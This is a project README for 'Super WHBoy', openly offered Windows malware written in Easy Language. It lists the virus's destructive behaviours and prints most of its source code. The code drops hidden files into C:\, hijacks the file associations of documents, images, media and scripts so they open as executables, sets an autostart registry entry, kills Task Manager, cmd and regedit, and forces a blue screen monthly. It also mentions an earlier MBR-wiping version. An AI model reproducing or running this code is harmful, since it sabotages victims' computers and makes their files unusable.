Super WHBoy
=
**Project Introduction**  
* This update:
  * Cancel the function of destroying MBR and keep BSOD on the 1st day of each month.
* It is written in easy language and C language.
* There are some files: self starting.e is the program after the virus is added and started; main.e is the main body of the program, which runs only once;Killwhboy.e is the source code of antivirus program;killwhboy.exe Is the compiled antivirus program;unknow:Necessary files for compiling or running virus Ontology.For more information, see wiki.
* Viral behavior:
  * a. Release self boot file and icon file in the root directory of the system; 
  * b. Modify the registry to change the default icon of EXE file to the icon file released under the root directory;
  * c.Destroy the opening mode of some files so that they cannot be opened; 
  * d. Shut down the computer after 10 minutes;
  * e.Open a web page every 18 seconds; 
  * f.Close CMD, tasklist and regedit every 1 second; 
  * g.A warning is sent every 25 seconds.
  * h.The computer will be Blue Screen of Death on the 1st of every month.
  * i.Press five random keys every 30 seconds.
* Detoxification method: first use disk tool to search for the lost partition and recover it, then rebuild the boot record and enter the system, then run the detoxification program. Or contact the author.If it is No.1, please adjust the time under PE or do not use the poisoned computer on the same day.
* The virus also has some vulnerabilities:
>You can call up the file extension through the folder option in the control panel, and change the suffix of CMD, tasklist or regedit to com, so that you can open the program and use it.   
## Tampering with file types  
.lnk、.doc、.docx、.ppt、.pptx、.xls、.xlsx、.png、.jpg、.jpeg、.bmp、.com、.mp3、.mp4、.avi、.mp5、.txt、.bat、.cmd、.vbs
、.java、.cpp  
# Main.e  
## Window assembly:  
`.版本 2  `  
`.支持库 eAPI  `  
`.程序集 窗口程序集_启动窗口  `  
`.子程序 __启动窗口_创建完毕  `  
`' 重启资源管理器  `  
`终止进程 (“explorer.exe”)  `  
`运行 (“explorer”, 假, #隐藏窗口)  `  
`' 释放病毒文件  `  
`写到文件 (“C:\icon.ico”, #icon)  `  
`写到文件 (“C:\wrom.exe”, #wrom)  `  
`写到文件 (“C:\img.bmp”, #img)  `  
`置文件属性 (“C:\wrom.exe”, #隐藏文件)  `  
`运行 (“C:\wrom.exe”, 假, )  `  
`' 修改注册表  `  
`写注册项 (#根类, “.lnk\”, “exefile”)  `  
`写注册项 (#根类, “.doc\”, “exefile”)  `  
`写注册项 (#根类, “.docx\”, “exefile”)  `  
`写注册项 (#根类, “.ppt\”, “exefile”)  `  
`写注册项 (#根类, “.pptx\”, “exefile”)  `  
`写注册项 (#根类, “.xls\”, “exefile”)  `  
`写注册项 (#根类, “.xlsx\”, “exefile”)  `  
`写注册项 (#根类, “.png\”, “exefile”)  `  
`设置桌面墙纸 (“C:\img.bmp”, 2)  `  
`' 文件关联2  `  
`写注册项 (#根类, “.jpg\”, “exefile”)  `  
`写注册项 (#根类, “.jpeg\”, “exefile”)  `  
`写注册项 (#根类, “.bmp\”, “exefile”)  `  
`写注册项 (#根类, “.com\”, “exefile”)  `  
`写注册项 (#根类, “.mp3\”, “exefile”)  `  
`写注册项 (#根类, “.mp4\”, “exefile”)  `  
`写注册项 (#根类, “.avi\”, “exefile”)  `  
`写注册项 (#根类, “.mp5\”, “exefile”)  `  
`写注册项 (#根类, “.txt\”, “exefile”)  `  
`写注册项 (#根类, “.bat\”, “exefile”)  `  
`写注册项 (#根类, “.cmd\”, “exefile”)  `  
`写注册项 (#根类, “.vbs\”, “exefile”)  `  
`写注册项 (#根类, “.java\”, “exefile”)  `  
`写注册项 (#根类, “.cpp\”, “exefile”)  `  
`写注册项 (#根类, “exefile\DefaultIcon\”, “C:\icon.ico”)  `  
`' 开机自启动  `  
`写注册项 (#本地机器, “software\microsoft\windows\CurrentVersion\Run\wrom”, “C:\wrom.exe”)  `  
`' 重启资源管理器  `  
`终止进程 (“explorer.exe”)  `  
`运行 (“explorer”, 假, #隐藏窗口)  `  
`信息框 (“Oh?”, 0, “Super WHBoy”, )  `  
`.子程序 _数值增加_周期事件  `  
`BoxNumber ＝ BoxNumber ＋ 1  `  
`.子程序 _自我防护_周期事件  `  
`终止进程 (“taskmgr.exe”)  `  
`终止进程 (“cmd.exe”)  `  
`终止进程 (“regedit.exe”)  `  
## Picture&Program res
`.版本 2`  
`.图片 icon`  
`.图片 wrom`  
`.图片 img` 
# Self Starting.e 
`.版本 2`  
`.子程序 _变卡_周期事件`  
`置随机数种子 ()`  
`超级链接框1.Internet地址 ＝ 到文本 (“www.” ＋ 字符 (取随机数 (1, 100)) ＋ 字符 (取随机数 (1, 100)) ＋ 字符 (取随机数 (1, 100)) ＋ 字符 (取随机数 (1, 100)) ＋ “.com”)`  
`超级链接框1.跳转 ()`  
**And Blue screen: **   
`.版本 2  `  
`.子程序 _时钟1_周期事件  `  
`编辑框1.内容 ＝ 到文本 (取现行时间 ())  `  
`.判断开始 (寻找文本 (编辑框1.内容, “1日”, , 假) ＞ 0)  `  
    `系统_蓝屏 ()  `  
**Pop up windows and buttons:**  
`.版本 2`  
`.支持库 eAPI`  
`.子程序 _警告弹窗_周期事件`  
`信息框 (“Your computer is poisoned!”, #错误图标, “Super WHBoy”, )`  
`.子程序 _按键事件_周期事件`  
`置随机数种子 ()`  
`.计次循环首 (5, )`  
    `模拟按键 (字符 (取随机数 (65, 90)), 字符 (取随机数 (65, 90)), 字符 (取随机数 (65, 90)))`  
    `模拟按键 (字符 (取随机数 (65, 90)), 字符 (取随机数 (65, 90)), )`  
`.计次循环尾 ()`  

